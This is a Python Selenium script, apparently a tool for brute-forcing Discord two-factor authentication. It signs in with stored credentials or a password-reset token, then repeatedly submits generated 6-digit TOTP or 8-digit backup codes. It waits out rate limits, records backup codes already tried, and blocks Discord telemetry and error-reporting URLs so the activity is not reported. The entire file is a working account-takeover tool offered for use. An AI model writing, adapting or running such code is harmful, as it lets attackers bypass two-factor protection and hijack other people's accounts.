# Import dependencies and libraries
import os
import time
import secrets
from dotenv import load_dotenv
from lib.codegen import genNormal, genBackup
from lib.textcolor import toColor

# Import Selenium libraries and dependencies
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

# Load in the credentials from .env
load_dotenv()

# Set the email and password variables from the environment variables
email = os.getenv('EMAIL')
password = os.getenv('PASSWORD')
token = os.getenv('TOKEN')
newpassword = os.getenv('NEWPASSWORD')

def TOTP(code):
# TOTP Logic
	# Chromium oprions.
	options = Options()
	options.add_experimental_option("excludeSwitches", ["enable-logging"])
	options.add_experimental_option("detach", True)
	# Get the Chromium web driver
	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
	#Blocking cloudflare and discord science URLS so they don't phone home
	driver.execute_cdp_cmd('Network.setBlockedURLs', {
		"urls": [
			"a.nel.cloudflare.com/report", 
			"https://discord.com/api/v10/science",
			"sentry.io"
		]
	})
	# Enable the network connectivity of the browser
	driver.execute_cdp_cmd('Network.enable', {})
	# Go to the discord login page
	driver.get("https://www.discord.com/login")
	# Wait 1 second before typing the email and password
	time.sleep(1)

	# Find the email and password login fields
	loginEmail = driver.find_element(by=By.NAME, value="email")
	loginPassword = driver.find_element(by=By.NAME, value="password")
	# Enter the email and password
	loginEmail.send_keys(email)
	loginPassword.send_keys(password)
	# Click Enter/Return to enter the password
	loginPassword.send_keys(Keys.RETURN)
	# Set up the statistics variables
	totpCount = 0
	ratelimitCount = 0
	stopLoop = False
	# loginTOTP = otp input field. TOTP stands for Timed One Time Password
	# Constantly run the script
	while not stopLoop:
		# Attempt to find the TOTP login field
		try:
			if loginEmail.is_displayed():
				continue
			else: 
				loginTOTP = driver.find_element(by=By.XPATH, value="//input[@type='text']")
			time.sleep(0.5)
			start = time.time()
			sleepy = 0

			#Logic to continuously enter OTP codes
			while not stopLoop:

				# Inform user TOTP field was found
				if totpCount == 0:
					print("TOTP login field: " + toColor("Found","green"))
					print("Forcer: " + toColor("Starting","green"))

				# Generate a new 8 or 6 digit code
				totp = (code[1](1))
				 # Check if 8 digit code has been used before, if true skip and generate new code
				if code[1] == genBackup:
					with open('.codes', 'a+') as f:
						f.seek(0)
						codes = f.read() 
						if totp in codes:
							continue 
						else:
							f.write(totp + '\n')
				# Enter code it into the TOTP field							
				loginTOTP.send_keys(totp)
				loginTOTP.send_keys(Keys.RETURN)
				totpCount += 1
				time.sleep(0.6)


				#Test for ratelimit
				if ("The resource is being rate limited." in driver.page_source):
					sleepy = secrets.choice(range(10, 15))
					ratelimitCount += 1
					print("Code: " + toColor(totp, "blue") + " was " + toColor("Ratelimited", "yellow") + ", will retry in " + toColor(sleepy, "blue"))
					# Wait for delay and retry code
					time.sleep(sleepy)
					loginTOTP.send_keys(Keys.RETURN)
					sleepy = secrets.choice(range(6, 10))
					
				# This means the password token has expired
				elif ("Token has expired" in driver.page_source): 
					#  Print this out as well as some statistics, and prompt the user to retry.
					elapsed = time.time() - start
					print(toColor("Token has expired.", "red"))
					stats = [totpCount, elapsed, ratelimitCount]
					inform(stats)
					# Close the browser.
					driver.close()
				
				elif ("Invalid two-factor auth ticket" in driver.page_source):
					# This means that Discord has expired this login session.
					#  Print this out as well as some statistics, and prompt the user to retry.
					elapsed = time.time() - start
					print(toColor("Invalid session ticket.", "red"))
					stats = [totpCount, elapsed, ratelimitCount]
					inform(stats)
					# Close the browser, wait 1 second and reopen.
					driver.close()
					time.sleep(1)
					TOTP(code)
				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
				else:
					sleepy = secrets.choice(range(6, 10))
				#Testing if the main app UI renders.
				try:
					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
					time.sleep(1)
					driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")	
					print("Code " + toColor(totp, "green") + " worked!")
					# Keep the browser open until user input.
					input("Press Enter to close the browser and stop...")
					stopLoop = True
					driver.close()
				except NoSuchElementException:
					# This means that the login was unsuccessful so let's inform the user and wait.
					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
					time.sleep(0.5)
					# Backspace the previously entered TOTP code.
					for i in range(code[0]):
						loginTOTP.send_keys(Keys.BACKSPACE)
					time.sleep(sleepy)
				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
		except (NoSuchElementException):
			pass

def PR(code):
# Password reset logic
	# Chromium oprions.
	options = Options()
	options.add_experimental_option("excludeSwitches", ["enable-logging"])
	options.add_experimental_option("detach", True)
	# If you want to run the program without the browser opening then remove the # from the options below 
	#options.add_argument('--headless')
	#options.add_argument('--log-level=1')
	# Get the Chromium web driver
	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
	#Blocking cloudflare and discord science URLS so they don't phone home
	driver.execute_cdp_cmd('Network.setBlockedURLs', {
		"urls": [
			"a.nel.cloudflare.com/report", 
			"https://discord.com/api/v10/science",
			"sentry.io"
		]
	})
	# Enable the network connectivity of the browser
	driver.execute_cdp_cmd('Network.enable', {})
	# Go to the discord page
	driver.get("https://discord.com/reset#token=" + token)
	# Wait 1 second before typing the email and password
	time.sleep(1)

	# Find the new password field
	loginPassword = driver.find_element(by=By.NAME, value="password")
	# Enter the new password
	loginPassword.send_keys(newpassword)
	# Click Enter/Return to enter the password
	loginPassword.send_keys(Keys.RETURN)
	# Set up the statistics variables
	totpCount = 0
	ratelimitCount = 0
	stopLoop = False
	# resetTOTP = otp input field. TOTP stands for Timed One Time Password
	# Constantly run the script
	while not stopLoop:
		# Attempt to find the TOTP login field
		try:
			resetTOTP = driver.find_element(by=By.XPATH, value="//input[@type='text']")
			time.sleep(0.5)
			start = time.time()
			sleepy = 0

			#Logic to continuously enter OTP codes
			while not stopLoop:

				# Inform user TOTP field was found
				if totpCount == 0:
					print("TOTP login field: " + toColor("Found","green"))
					print("Forcer: " + toColor("Starting","green"))

				# Generate a new 8 or 6 digit code
				totp = (code[1](1))
				 # Check if 8 digit code has been used before, if true skip and generate new code
				if code[1] == genBackup:
					with open('.codes', 'a+') as f:
						f.seek(0)
						codes = f.read() 
						if totp in codes:
							continue 
						else:
							f.write(totp + '\n')
				# Enter code it into the TOTP field							
				resetTOTP.send_keys(totp)
				resetTOTP.send_keys(Keys.RETURN)
				totpCount += 1
				time.sleep(0.6)

				#Test for ratelimit
				if ("The resource is being rate limited." in driver.page_source):
					sleepy = secrets.choice(range(10, 15))
					ratelimitCount += 1
					print("Code: " + toColor(totp, "blue") + " was " + toColor("Ratelimited", "yellow") + ", will retry in " + toColor(sleepy, "blue"))
					# Wait for delay and retry code
					time.sleep(sleepy)
					resetTOTP.send_keys(Keys.RETURN)
					sleepy = secrets.choice(range(6, 10))
					
				# This means the password token has expired
				elif ("Token has expired" in driver.page_source): 
					#  Print this out as well as some statistics, and prompt the user to retry.
					elapsed = time.time() - start
					print(toColor("Token has expired.", "red"))
					stats = [totpCount, elapsed, ratelimitCount]
					inform(stats)
					# Close the browser.
					driver.close()
				
				elif ("Invalid two-factor auth ticket" in driver.page_source):
					# This means that Discord has expired this login session.
					# Print this out as well as some statistics, and prompt the user to retry.
					elapsed = time.time() - start
					print(toColor("Invalid session ticket.", "red"))
					stats = [totpCount, elapsed, ratelimitCount]
					inform(stats)
					# Close the browser, wait 1 second and reopen.
					driver.close()
					time.sleep(1)
					PR(code)
				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
				else:
					sleepy = secrets.choice(range(6, 10))
				#Testing if the main app UI renders.
				try:
					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
					time.sleep(1)
					driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")	
					print("Code " + toColor(totp, "green") + " worked!")
					# Keep the browser open until user input.
					input("Press Enter to close the browser and stop...")
					stopLoop = True
					driver.close()
				except NoSuchElementException:
					# This means that the login was unsuccessful so let's inform the user and wait.
					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
					time.sleep(0.5)
					# Backspace the previously entered TOTP code.
					for i in range(code[0]):
						resetTOTP.send_keys(Keys.BACKSPACE)
					time.sleep(sleepy)
				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
		except (NoSuchElementException):
			pass

def inform(stats):
	# Print the number of tried codes.
	print("Number of tried codes: " + toColor(stats[0], "blue"))
	# Print the time elapsed for codes.
	print("Time elapsed for codes: " + toColor(stats[1], "blue"))
	# Print the number of ratelimits.
	print("Number of ratelimits: " + toColor(stats[2], "blue"))
	pass

if __name__ == "__main__":
	# Set variable for code menu
	Input = "What type of code would you like to generate?\n["+toColor("1","green")+"] - "+toColor("8","green")+" Digit Backup Code\n["+toColor("2","green")+"] - "+toColor("6","green")+" Digit Normal Code\n "
	# Ask the user what mode they want to use
	menu = int(input("Are you trying a password reset?\n["+toColor("1","green")+"] - Yes\n["+toColor("2","green")+"] - No\n "))
	match menu:
		# Password reset mode
		case 1:
			t = int(input(Input))
			match t:
				# Code generation mode
				case 1:
					# 8 Digit Backup Code
					code = [9, genBackup]
				case 2:
					# 6 Digit Normal Code
					code = [6, genNormal]
				case _:
					print("Invalid option entered!")	
			PR(code)			
		# TOTP reset mode
		case 2:
			t = int(input(Input))
			match t:
				# Code generation mode
				case 1:
					# 8 Digit Backup Code
					code = [9, genBackup]
				case 2:
					# 6 Digit Normal Code
					code = [6, genNormal]
				case _:
					print("Invalid option entered!")
			TOTP(code)	
		case _:
			print("Invalid option entered!")
